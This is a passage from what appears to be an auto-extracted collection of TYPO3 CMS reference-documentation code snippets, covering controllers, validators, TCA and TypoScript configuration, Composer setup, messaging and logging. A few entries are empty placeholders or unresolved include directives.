\"type\":\"item\",\n      \"label\":\"Show\",\n      \"icon\":\"<span class=\\\"t3js-icon icon icon-size-small icon-state-default icon-actions-document-view\\\" data-identifier=\\\"actions-document-view\\\">\\n\\t<span class=\\\"icon-markup\\\">\\n<img src=\\\"\\/typo3\\/sysext\\/core\\/Resources\\/Public\\/Icons\\/T3Icons\\/actions\\/actions-document-view.svg\\\" width=\\\"16\\\" height=\\\"16\\\" \\/>\\n\\t<\\/span>\\n\\t\\n<\\/span>\",\n      \"additionalAttributes\":{\n         \"data-preview-url\":\"http:\\/\\/typo37.local\\/index.php?id=47\"\n      },\n      \"callbackAction\":\"viewRecord\"\n   },\n   \"edit\":{\n      \"type\":\"item\",\n      \"label\":\"Edit\",\n      \"icon\":\"\",\n      \"additionalAttributes\":[\n      ],\n      \"callbackAction\":\"editRecord\"\n   },\n   \"divider1\":{\n      \"type\":\"divider\",\n      \"label\":\"\",\n      \"icon\":\"\",\n      \"additionalAttributes\":[\n\n      ],\n      \"callbackAction\":\"\"\n   },\n   \"more\":{\n      \"type\":\"submenu\",\n      \"label\":\"More options...\",\n      \"icon\":\"\",\n      \"additionalAttributes\":[\n\n      ],\n      \"callbackAction\":\"openSubmenu\",\n      \"childItems\":{\n         \"newWizard\":{\n            \"type\":\"item\",\n            \"label\":\"'Create New' wizard\",\n            \"icon\":\"\",\n            \"additionalAttributes\":{\n            },\n            \"callbackAction\":\"newContentWizard\"\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing RSS Feed Display Controller in TYPO3 (PHP)\nDESCRIPTION: A controller action that handles RSS feed display for blog posts. It retrieves either a default blog or the first available blog, assigns it to the view, and returns an XML response. The method configures proper content type headers and handles the response formatting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Controllers/Settings.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\n\nclass PostController extends AbstractController\n{\n    public function displayRssListAction(): ResponseInterface\n    {\n        $defaultBlog = $this->settings['defaultBlog'] ?? 0;\n        if ($defaultBlog > 0) {\n            $blog = $this->blogRepository->findByUid((int)$defaultBlog);\n        } else {\n            $blog = $this->blogRepository->findAll()->getFirst();\n        }\n        $this->view->assign('blog', $blog);\n        return $this->responseFactory->createResponse()\n            ->withHeader('Content-Type', 'text/xml; charset=utf-8')\n            ->withBody($this->streamFactory->createStream($this->view->render()));\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Blog Validator in TYPO3 CMS (PHP)\nDESCRIPTION: This code snippet defines a BlogValidator class that validates Blog objects. It checks for the correct instance type, validates the number of categories, and checks the subtitle's validity. The validator uses a blog validation service and adds specific errors for invalid conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Validator/ObjectValidator.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\nuse TYPO3\\CMS\\Extbase\\Utility\\LocalizationUtility;\n\nfinal class BlogValidator extends AbstractValidator\n{\n    protected function isValid(mixed $value): void\n    {\n        if (!$value instanceof Blog) {\n            $errorString = 'The blog validator can only handle classes '\n                . 'of type T3docs\\BlogExample\\Domain\\Validator\\Blog. '\n                . $value::class . ' given instead.';\n            $this->addError($errorString, 1297418975);\n        }\n        if (!$this->blogValidationService->isBlogCategoryCountValid($value)) {\n            $errorString = LocalizationUtility::translate(\n                'error.Blog.tooManyCategories',\n                'BlogExample'\n            );\n            // Add the error to the property if it is specific to one property\n            $this->addErrorForProperty('categories', $errorString, 1297418976);\n        }\n        if (!$this->blogValidationService->isBlogSubtitleValid($value)) {\n            $errorString = LocalizationUtility::translate(\n                'error.Blog.invalidSubTitle',\n                'BlogExample'\n            );\n            // Add the error directly if it takes several properties into account\n            $this->addError($errorString, 1297418974);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring LinkHandler for Book Reports in Page TSconfig\nDESCRIPTION: This Page TSconfig snippet shows how to set up a LinkHandler for book reports, which are also stored as news records. It configures a reduced page tree starting from a specific page.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.bookreports {\n    handler = TYPO3\\CMS\\Backend\\LinkHandler\\RecordLinkHandler\n    label = Book Reports\n    configuration {\n        table = tx_news_domain_model_news\n        storagePid = 42\n        pageTreeMountPoints = 42\n        hidePageTree = 0\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Constructing Complex Query with Junctions in PHP\nDESCRIPTION: Example of using AND and OR junctions to find tt_content records based on multiple conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n// Code snippet not provided in the text\n```\n\n----------------------------------------\n\nTITLE: Using AfterFileMetaDataDeletedEvent in TYPO3 CMS\nDESCRIPTION: The AfterFileMetaDataDeletedEvent is fired after all metadata of a file has been removed. This event allows developers to manage custom metadata that was previously added to a file. It provides access to the file uid and tablenames where the metadata was stored.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileMetaDataDeletedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class AfterFileMetaDataDeletedEvent\n{\n    public function __construct(\n        private readonly int $fileUid,\n        private readonly string $tableName\n    ) {\n    }\n\n    public function getFileUid(): int\n    {\n        return $this->fileUid;\n    }\n\n    public function getTableName(): string\n    {\n        return $this->tableName;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Database Table References in SQL\nDESCRIPTION: References to the TYPO3 database tables that can be modified through this event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileAddedToIndexEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nsys_file\n```\n\nLANGUAGE: sql\nCODE:\n```\nsys_file_metadata\n```\n\n----------------------------------------\n\nTITLE: Updating TYPO3 Template to Use POST Forms for Delete Actions\nDESCRIPTION: This template revision shows how to change GET-based delete links to POST-based form submissions in a TYPO3 backend module, improving security against CSRF attacks by ensuring state-changing operations use POST requests.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/SecurityConsiderations.rst#2025-04-16_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n<ul>\n<f:for each=\"{things}\" as=\"thing\">\n    <li>\n        {thing.name}:\n-         <a href=\"{f:be.uri(\n-                 route: 'demo.delete',\n-                 parameters: '{action: \\'delete\\', thing: thing.uid}'\n-             )}\" class=\"btn btn-default\">delete</a>\n+         <button\n+             name=\"thing\" value=\"{thing.uid}\"\n+             type=\"submit\" form=\"demo-module-form-delete-action\"\n+             class=\"btn btn-default\">delete</button>\n    </li>\n</f:for>\n</ul>\n+ <form\n+     action=\"{f:be.uri(route: 'demo.delete')}\" method=\"post\"\n+     id=\"demo-module-form-delete-action\" class=\"hidden\"></form>\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 ModifyPageLayoutOnLoginProviderSelectionEvent Class\nDESCRIPTION: PHP namespace reference to the ModifyPageLayoutOnLoginProviderSelectionEvent class used for modifying login provider view variables.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyPageLayoutOnLoginProviderSelectionEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\LoginProvider\\Event\\ModifyPageLayoutOnLoginProviderSelectionEvent\n```\n\n----------------------------------------\n\nTITLE: Enabling Required PHP Extensions in php.ini\nDESCRIPTION: Demonstrates how to enable the openssl and fileinfo PHP extensions by uncommenting or adding lines in the php.ini file. These extensions are required for TYPO3 CMS to function properly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/PHP.rst#2025-04-16_snippet_0\n\nLANGUAGE: INI\nCODE:\n```\nextension=fileinfo.so\nextension=openssl.so\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Variables to SEL Provider\nDESCRIPTION: Implementation showing how to add custom variables to a Symfony Expression Language provider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SymfonyExpressionLanguage/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nclass CustomTypoScriptConditionProvider extends AbstractProvider\n{\n    public function __construct()\n    {\n        $this->expressionLanguageVariables = [\n            'variableA' => 'valueB',\n        ];\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Modifying FileUpload Configuration in Extbase Controller\nDESCRIPTION: Example of modifying existing file upload configuration in an Extbase controller's initialize action. This demonstrates how to change the minimum file requirement, add a custom validator, and set a custom upload folder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\npublic function initializeCreateAction(): void\n{\n    $validator = GeneralUtility::makeInstance(MyCustomValidator::class);\n\n    $argument = $this->arguments->getArgument('myArgument');\n    $configuration = $argument->getFileHandlingServiceConfiguration()->getFileUploadConfigurationForProperty('file');\n    $configuration?->setMinFiles(2);\n    $configuration?->addValidator($validator);\n    $configuration?->setUploadFolder('1:/user_upload/custom_folder');\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Composer Configuration for TYPO3 CMS\nDESCRIPTION: Initial composer.json configuration showing repository setup and TYPO3 CMS specific settings for web directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"repositories\": [\n        {\n            \"type\": \"vcs\",\n            \"url\": \"https://github.com/foo/bar.git\"\n        }\n    ],\n    \"extra\": {\n        \"typo3/cms\": {\n            \"web-dir\": \"public\"\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Aggregate Functions in PHP\nDESCRIPTION: Demonstrates the use of aggregate functions like COUNT, AVG, MIN, MAX in SELECT queries, often combined with GROUP BY.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n// Code snippet not provided in the text\n```\n\n----------------------------------------\n\nTITLE: ContentObjectRenderer Access Pattern in TYPO3\nDESCRIPTION: Demonstrates accessing the ContentObjectRenderer through request attribute and setter injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/TSFE/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$currentContentObject = $request->getAttribute('currentContentObject');\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Service Configuration Syntax Pattern\nDESCRIPTION: General syntax pattern for configuring TYPO3 services showing the structure of the configuration array with service type, service key, and config key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/ServiceConfiguration.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF'][service type][service key][config key] = value;\n```\n\n----------------------------------------\n\nTITLE: Implementing Form Submission on Change in TYPO3 CMS HTML Forms\nDESCRIPTION: This snippet demonstrates how to submit a form automatically when a checkbox value changes in TYPO3 CMS. It uses the 'data-global-event' and 'data-action-submit' attributes to trigger the submission. The form can be referenced using '$form' or a CSS selector.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Forms/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"checkbox\" data-global-event=\"change\" data-action-submit=\"$form\">\n<!-- ... or (using CSS selector) ... -->\n<input type=\"checkbox\" data-global-event=\"change\" data-action-submit=\"#formIdentifier\">\n```\n\n----------------------------------------\n\nTITLE: Getting Last Insert ID with Connection in TYPO3\nDESCRIPTION: Example of using the lastInsertId() method to retrieve the uid of the last inserted record, which is useful when the ID needs to be used directly afterwards.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\npublic function createSomething(string $value): int\n{\n    $connectionPool = GeneralUtility::makeInstance(ConnectionPool::class);\n    $connection = $connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $connection->insert(\n        'tx_myextension_domain_model_mytable',\n        [\n            'title' => $value,\n        ]\n    );\n    $newUid = $connection->lastInsertId();\n\n    // Maybe insert more stuff to another table that needs this relation\n\n    return $newUid;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Field Description to TCA for Backend User Groups in TYPO3\nDESCRIPTION: This snippet demonstrates how to add a descriptive text to the usergroup field in the backend user form through TCA configuration. The description explains the naming convention prefixes used for different types of user groups.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/PermissionsManagement/SettingUpBackendGroups/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA']['be_users']['columns']['usergroup']['description'] =\n 'Prefixes: R_ - Role, PG_ - Page Group, DBM_ - Database Mount, FM_ - File Mount,' .\n 'FO_ - File Operations, CM_ - Category Mount, ACL_ - Access Control';\n```\n\n----------------------------------------\n\nTITLE: Overlaying Workspace Versions in TYPO3 Backend\nDESCRIPTION: Demonstrates how to overlay a record with its workspace version using BackendUtility::workspaceOL(). This function works similarly to sys_page->versionOL() but is intended for backend use.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Backend\\Utility\\BackendUtility\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n$result = $queryBuilder\n   ->select('*')\n   ->from('pages')\n   ->where(\n      $queryBuilder->expr()->eq('uid',\n         $queryBuilder->createNamedParameter($id, Connection::PARAM_INT)\n      )\n   )\n   ->executeQuery();\n$row = $result->fetchAssociative();\nBackendUtility::workspaceOL('pages', $row);\n```\n\n----------------------------------------\n\nTITLE: Setting Temporary File Path for Spool\nDESCRIPTION: This snippet specifies where messages will temporarily be stored when using the file type for spool transport. The location must be outside the webroot for security reasons.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_19\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_spool_filepath']\n:type: text\n:Default: ''\n\n*only with transport_spool_type=file* Path where messages get temporarily stored.\n```\n\n----------------------------------------\n\nTITLE: Installing Multiple TYPO3 Core Extensions\nDESCRIPTION: Commands for installing TYPO3 core packages individually. This example shows how to add the minimal TYPO3 core and the scheduler system extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncomposer require typo3/minimal:^12.4\ncomposer require typo3/cms-scheduler:^12.4\ncomposer require ...\n```\n\n----------------------------------------\n\nTITLE: Adding a Toggle DropDown Item to TYPO3 Dropdown Button\nDESCRIPTION: This code shows how to add a toggle item to a dropdown button in TYPO3 backend. Toggle items can be set to active or inactive state and display a checkmark when active, making them suitable for boolean options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ButtonComponents.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$item = GeneralUtility::makeInstance(DropDownToggle::class)\n    ->setHref('#')\n    ->setActive(true)\n    ->setLabel('My label')\n    ->setTitle('My title')\n    ->setIcon($this->iconFactory->getIcon('actions-heart'))\n    ->setAttributes(['data-value' => '123']);\n$dropDownButton->addItem($item);\n```\n\n----------------------------------------\n\nTITLE: Defining TCA Configuration in TYPO3 PHP\nDESCRIPTION: This PHP snippet is a part of the TCA (Table Configuration Array) configuration for the `tx_tea_domain_model_tea` within a TYPO3 extension. It specifies a field titled 'title' with a label and configuration including input type, size restrictions, maximum length, evaluation rules, and a required constraint. No external PHP dependencies are mentioned. This setup is crucial for the TYPO3 backend system to validate and display the 'title' field appropriately for tea entries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/Configuration/TCA/TeaColumnTitle.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n[\n    'columns' => [\n        'title' => [\n            'label' => 'LLL:EXT:tea/Resources/Private/Language/locallang_db.xlf:tx_tea_domain_model_tea.title',\n            'config' => [\n                'type' => 'input',\n                'size' => 40,\n                'max' => 255,\n                'eval' => 'trim',\n                'required' => true,\n            ],\n        ],\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Completing TYPO3 Ajax Controller with Response Handling\nDESCRIPTION: Finalizes the Ajax controller by adding proper response handling. Returns JSON response with the calculation result.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/Ajax.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Core\\Http\\JsonResponse;\n\nclass ExampleController\n{\n    public function doSomethingAction(ServerRequestInterface $request): ResponseInterface\n    {\n        $queryParams = $request->getQueryParams();\n        $input = (int)($queryParams['input'] ?? 0);\n        $result = $input ** 2;\n\n        return new JsonResponse(['result' => $result]);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating DocumentFragment Content for MultiStepWizard Slide\nDESCRIPTION: Example of creating content for a MultiStepWizard slide using DocumentFragment. This approach creates a document fragment with HTML content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/MultiStepWizard.rst#2025-04-16_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.createRange().createContextualFragment(\"<div>Your HTML content</div>\");\n```\n\n----------------------------------------\n\nTITLE: Customizing Tea Repository with Default Orderings and Custom Find Method\nDESCRIPTION: This snippet demonstrates a more advanced repository implementation for the Tea model. It overrides the default orderings and includes a custom find method to retrieve teas by type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Repository.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace TTN\\Tea\\Domain\\Repository\\Product;\n\nuse TTN\\Tea\\Domain\\Model\\Product\\Tea;\nuse TYPO3\\CMS\\Extbase\\Persistence\\QueryInterface;\nuse TYPO3\\CMS\\Extbase\\Persistence\\Repository;\n\n/**\n * @extends Repository<Tea>\n */\nclass TeaRepository extends Repository\n{\n    /**\n     * @var array<string, string>\n     */\n    protected $defaultOrderings = [\n        'title' => QueryInterface::ORDER_ASCENDING,\n    ];\n\n    /**\n     * Finds teas by type.\n     *\n     * @param int $type\n     * @return Tea[]\n     */\n    public function findByType(int $type): array\n    {\n        $query = $this->createQuery();\n        $query->matching($query->equals('type', $type));\n        return $query->execute()->toArray();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Dynamic URL Navigation with Data Value\nDESCRIPTION: HTML select element that navigates to a dynamic URL constructed from the selected value. Uses template substitution to build the final URL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Navigation/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<select\n    value=\"0\"\n    name=\"depth\"\n    data-global-event=\"change\"\n    data-action-navigate=\"$data=~s/$value/\"\n    data-navigate-value=\"https://example.org/${value}\"\n>\n    <!-- ... options ... -->\n</select>\n```\n\n----------------------------------------\n\nTITLE: Configuring Image Field in TYPO3 TCA\nDESCRIPTION: This snippet shows how to define an image field in the TCA. It configures the field to allow uploading of image files with specific file extensions and sets display properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Model.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n'image' => [\n    'exclude' => true,\n    'label' => 'LLL:EXT:tea/Resources/Private/Language/locallang_db.xlf:tx_tea_domain_model_tea.image',\n    'config' => [\n        'type' => 'file',\n        'allowed' => 'common-image-types',\n        'appearance' => [\n            'createNewRelationLinkTitle' => 'LLL:EXT:frontend/Resources/Private/Language/locallang_ttc.xlf:images.addFileReference',\n        ],\n        // We want exactly one image here.\n        'minitems' => 0,\n        'maxitems' => 1,\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Messenger Routing Configuration\nDESCRIPTION: Configuration examples for TYPO3's messenger component routing, showing default synchronous transport setup and custom message routing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['messenger']['routing'] = [\n    '*' => 'default',\n];\n```\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['messenger']['routing'][\\MyVendor\\MyExtension\\Queue\\Message\\DemoMessage::class]\n    = 'doctrine';\n```\n\n----------------------------------------\n\nTITLE: Configuring Site Settings Definitions in YAML for TYPO3 CMS\nDESCRIPTION: This YAML snippet demonstrates how to define site settings for the Blog Example extension in TYPO3 CMS. It shows the structure for defining categories, subcategories, and individual settings with their properties such as label, description, and type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingsEditor.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\neditor:\n  categories:\n    main:\n      label: 'Blog settings'\n      categories:\n        generalSettings: 'General settings'\n        commentSettings: 'Comment settings'\n\nsettings:\n  postsPerPage:\n    category: main.generalSettings\n    label: 'Posts per page'\n    description: 'Number of posts to display per page'\n    type: integer\n    value: 3\n    validation:\n      - type: range\n        options:\n          min: 1\n          max: 20\n\n  defaultAuthor:\n    category: main.generalSettings\n    label: 'Default author'\n    type: text\n    value: 'John Doe'\n```\n\n----------------------------------------\n\nTITLE: Configuring Record XML Sitemap in TypoScript\nDESCRIPTION: TypoScript configuration for setting up XML sitemaps for custom records like news entries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_seo {\n    config {\n        <sitemapType> {\n            sitemaps {\n                <unique key> {\n                    provider = TYPO3\\CMS\\Seo\\XmlSitemap\\RecordsXmlSitemapDataProvider\n                    config {\n                        table = news_table\n                        sortField = sorting\n                        lastModifiedField = tstamp\n                        changeFreqField = news_changefreq\n                        priorityField = news_priority\n                        additionalWhere = AND ({#no_index} = 0 OR {#no_follow} = 0)\n                        pid = <page id('s) containing news records>\n                        recursive = <number of subpage levels taken into account beyond the pid page. (default: 0)>\n                        url {\n                            pageId = <your detail page id>\n                            fieldToParameterMap {\n                                uid = tx_extension_pi1[news]\n                            }\n                            additionalGetParameters {\n                                tx_extension_pi1.controller = News\n                                tx_extension_pi1.action = detail\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Systemd Service Configuration for TYPO3 Message Consumer\nDESCRIPTION: Example systemd service configuration to run the TYPO3 message consumer as a system service. This ensures the consumer restarts automatically after the time limit or upon errors.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: INI\nCODE:\n```\n[Unit]\nDescription=Run the TYPO3 message consumer\nRequires=mariadb.service\nAfter=mariadb.service\n\n[Service]\nType=simple\nUser=www-data\nGroup=www-data\nExecStart=/usr/bin/php8.1 /var/www/myproject/vendor/bin/typo3 messenger:consume doctrine --exit-code-on-limit 133\n# Generally restart on error\nRestart=on-failure\n# Restart on exit code 133 (which is returned by the command when limits are reached)\nRestartForceExitStatus=133\n# ..but do not interpret exit code 133 as an error (as it's just a restart request)\nSuccessExitStatus=133\n\n[Install]\nWantedBy=multi-user.target\n```\n\n----------------------------------------\n\nTITLE: Configuring RTE in TYPO3 TCA\nDESCRIPTION: Example of enabling Rich Text Editor functionality in a TCA configuration file for a custom table field. The key enableRichtext is set to true to activate the RTE feature.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/InTheBackend/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  literalinclude:: _tca-rte.php\n    :emphasize-lines: 11\n    :caption: packages/my_extension/Configuration/TCA/tx_myextension_table.php\n```\n\n----------------------------------------\n\nTITLE: Cache Warmup Command Syntax for TYPO3 CLI\nDESCRIPTION: Command-line syntax for warming up TYPO3 caches. This is useful after clearing caches to pre-populate them and avoid performance drops for visitors.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Logger for Custom TYPO3 Class\nDESCRIPTION: Example of configuring a custom logger for a specific class in TYPO3. This configuration sets up a FileWriter for the class MyVendor\\MyExtension\\MyFolder\\MyClass to write logs to a specific file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Writers/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['MyVendor']['MyExtension']['MyFolder']['MyClass']['writerConfiguration'] = [\n    // configuration for INFO severity\n    \\TYPO3\\CMS\\Core\\Log\\LogLevel::INFO => [\n        // add a FileWriter\n        \\TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter::class => [\n            // configuration for the writer\n            'logFile' => \\TYPO3\\CMS\\Core\\Core\\Environment::getVarPath() . '/log/myextension.log'\n        ]\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Implementing a Debug Action in TYPO3 Admin Module Controller\nDESCRIPTION: This snippet demonstrates how to implement a debug action method in a TYPO3 admin module controller. It processes request data, handles different command options through a switch statement, and returns a response using the TYPO3 ModuleTemplate view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/_ModuleConfiguration/_AdminModuleControllerDebugAction.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\n\nfinal readonly class AdminModuleController\n{\n    protected function debugAction(\n        ServerRequestInterface $request,\n        ModuleTemplate $view,\n    ): ResponseInterface {\n        $body = $request->getParsedBody();\n        if (is_array($body)) {\n            $cmd = $body['tx_examples_admin_examples']['cmd'] ?? 'cookies';\n            switch ($cmd) {\n                case 'cookies':\n                    $this->debugCookies();\n                    break;\n                default:\n                    // do something else\n            }\n\n            $view->assignMultiple(\n                [\n                    'cookies' => $request->getCookieParams(),\n                    'lastcommand' => $cmd,\n                ],\n            );\n        }\n        return $view->renderResponse('AdminModule/Debug');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Module Aliases in TYPO3 Backend\nDESCRIPTION: Example of creating aliases for a TYPO3 backend module, allowing alternative identifiers to be used for routing and references.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleConfiguration/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: 